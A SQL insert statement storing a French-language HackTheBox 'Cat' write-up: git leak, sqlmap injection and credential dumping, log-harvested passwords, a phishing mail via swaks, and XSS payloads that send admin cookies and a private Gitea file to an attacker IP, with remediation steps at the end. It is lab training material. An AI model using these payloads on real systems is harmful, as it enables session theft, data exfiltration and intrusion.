/*
  # Ajout du write-up Cat HTB
  
  1. Contenu
    - Ajout d'un nouveau write-up détaillé pour la machine Cat de HackTheBox
    - Inclut une analyse complète de l'exploitation
    - Contient des détails sur la méthodologie et les étapes de remédiation
*/

INSERT INTO writeups (
  title,
  slug,
  content,
  platform,
  difficulty,
  points,
  tags,
  published,
  description,
  images
) VALUES (
  'HackTheBox: Cat - Analyse Complète',
  'hackthebox-cat-analysis',
  '# **Write-up: Cat HTB** 🐱

## **🟢 Phase 1 - Reconnaissance**
Nous commençons par **scanner la machine** pour identifier les services ouverts.

### **📌 Scan Nmap**
```bash
nmap -sC -sV -oN scan_cat.txt cat.htb
```
**Résultats :**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache 2.4.41
```
➡️ Deux services intéressants :
- Un **serveur web Apache sur le port 80**.
- Un **serveur SSH**.

Nous allons donc nous concentrer sur le **port 80** en premier.

---

### **📌 Exploration Web**
Nous visitons `http://cat.htb/` et trouvons un site **dédié aux chats**. Il y a une fonctionnalité de **soumission de photos de chats**, ce qui pourrait être intéressant pour un potentiel **upload de fichiers**.

Nous lançons **dirsearch** pour explorer les chemins cachés :
```bash
dirsearch -u http://cat.htb -w /usr/share/wordlists/dirb/common.txt -x 403,404
```
**Résultats :**
```
/.git/                 (200)   --> 🔥 GIT LEAK 🚨
/contest.php           (200)   
/view_cat.php          (200)   
/config.php            (403)
```
➡️ La présence de `.git/` indique qu''un **dépôt Git** a été exposé par erreur.

---

## **🟠 Phase 2 - Exploitation du Git Leak**
Nous clonons l''intégralité du dépôt :
```bash
git-dumper http://cat.htb/.git/ ./catgit
cd catgit
```
Nous analysons le code source et trouvons plusieurs fichiers intéressants :

1. **config.php** ➝ Contient la configuration de la base de données.
2. **view_cat.php** ➝ Possiblement vulnérable à une injection **XSS**.
3. **accept_cat.php** ➝ Contient une **SQL Injection**.

---

## **🔴 Phase 3 - Exploitation de l''XSS**
Dans `view_cat.php`, nous voyons ceci :
```php
<div class="container">
    <h1>Cat Details: <?php echo $cat[''cat_name'']; ?></h1>
    <img src="<?php echo $cat[''photo_path'']; ?>" alt="<?php echo $cat[''cat_name'']; ?>" class="cat-photo">
    <div class="cat-info">
        <strong>Name:</strong> <?php echo $cat[''cat_name'']; ?><br>
        <strong>Owner:</strong> <?php echo $cat[''username'']; ?><br>
    </div>
</div>
```
💥 **Le problème ?**  
Le `username` est affiché **sans être échappé**, ce qui permet une injection XSS.

### **📌 Plan d''attaque :**
1. Nous **créons un compte** avec un nom malveillant contenant un **payload XSS** :
   ```html
   <img src=1 onerror="document.location=''http://10.10.xx.xx/?ccc=''+encodeURIComponent(document.cookie)">
   ```
2. Nous **soumettons une photo** sur `contest.php`, ce qui attire l''attention d''un administrateur.
3. Lorsqu''il visualise l''image, **notre script XSS est exécuté**, récupérant son **cookie de session**.
4. Nous utilisons ce cookie pour nous **connecter à son compte administrateur**.

---

## **🟣 Phase 4 - Exploitation de la SQL Injection**
Dans `accept_cat.php`, nous trouvons :
```php
$sql_insert = "INSERT INTO accepted_cats (name) VALUES (''$cat_name'')";
$pdo->exec($sql_insert);
```
➡️ **La variable `$cat_name` n''est pas protégée**, ce qui permet une injection SQL.

Nous exploitons cela avec **sqlmap** :
```bash
sqlmap -u "http://cat.htb/accept_cat.php" --cookie="PHPSESSID=918f1nvps72fc7rvk5umu13jch" --data="catId=1&catName=123" -p catName --dbms=SQLite --level=5
```
**Résultats :**
```
[INFO] Table ''users'' found!
```
Nous **dumper** la table `users` :
```bash
sqlmap -u "http://cat.htb/accept_cat.php" --cookie="PHPSESSID=918f1nvps72fc7rvk5umu13jch" --data="catId=1&catName=123" -p catName --dbs --dump
```
**Nous obtenons plusieurs comptes et leurs mots de passe hashés.**  
Après un **crack de hash MD5** (avec CrackStation), nous récupérons les identifiants de **rosa**.

---

## **🟤 Phase 5 - Escalade de Privilèges**
Nous nous connectons en **SSH** avec **rosa** :
```bash
ssh rosa@cat.htb
```
Nous analysons les logs Apache :
```bash
cat /var/log/apache2/access.log | grep axel
```
🔥 **Bingo !** Nous trouvons un identifiant en clair dans les logs et pouvons nous connecter avec **axel**.

---

## **🟢 Phase 6 - Root via Gitea (XSS & LFI)**
Nous découvrons que le **port 3000** (Gitea) tourne en local.  
Nous le **redirigeons** via SSH :
```bash
ssh -L 3000:127.0.0.1:3000 rosa@cat.htb
```
Nous accédons à `http://localhost:3000/` et voyons que **Gitea est en version 1.22.0**, qui est **vulnérable à un XSS** (CVE-2024-6886).

### **📌 Exploitation**
1. Nous créons un **nouveau repo** et injectons une **XSS** dans sa description :
   ```html
   <a href="javascript:fetch(''http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php'')
   .then(response => response.text())
   .then(data => fetch(''http://10.10.xx.xx/?content=''+encodeURIComponent(data)))">XSS test</a>
   ```
2. Nous envoyons un **mail piégé** à Jobert :
   ```bash
   swaks --to "jobert@localhost" --from "axel@localhost" --header "Click" --body "http://localhost:3000/axel/xss" --server localhost
   ```
   L''administrateur clique et exécute notre XSS.
3. **Notre script exfiltre le fichier `index.php`**, qui contient des **identifiants admin**.
4. Nous utilisons ces identifiants pour **devenir root**.

---

# **🏆 Résumé**
| Étape | Exploitation |
|--------|--------------|
| **Recon** | Scan nmap + Git Leak |
| **User** | XSS + vol de cookie → Admin panel |
| **Pivot** | SQLi dans `accept_cat.php` → Vol des creds de rosa |
| **Escalade** | Logs Apache exposés → Vol des creds de axel |
| **Root** | Gitea 1.22.0 → XSS → Exploitation d''un repo privé |

---

## **🛡️ Remédiation (Résumé)**
1. **Git Leak** → Bloquer `.git/` sur le serveur web.
2. **XSS** → Échapper toutes les entrées utilisateur (`htmlspecialchars()`).
3. **SQLi** → Utiliser des requêtes préparées (`PDO::prepare()`).
4. **Logs sensibles** → Ne pas stocker d''identifiants en clair.
5. **Mise à jour de Gitea** → Version patchée.

---

## **🚀 Conclusion**
Cette box était une **chaîne d''exploitation complète**, combinant **Git Leak, XSS, SQLi et un détournement de Gitea** pour escalader jusqu''à root.',
  'hackthebox',
  'Difficile',
  50,
  ARRAY['Git Leak', 'XSS', 'SQL Injection', 'Privilege Escalation', 'Gitea', 'CVE-2024-6886'],
  true,
  'Analyse détaillée d''une machine combinant Git Leak, XSS, SQLi et exploitation de Gitea pour une escalade de privilèges complète.',
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/cat.htb']
);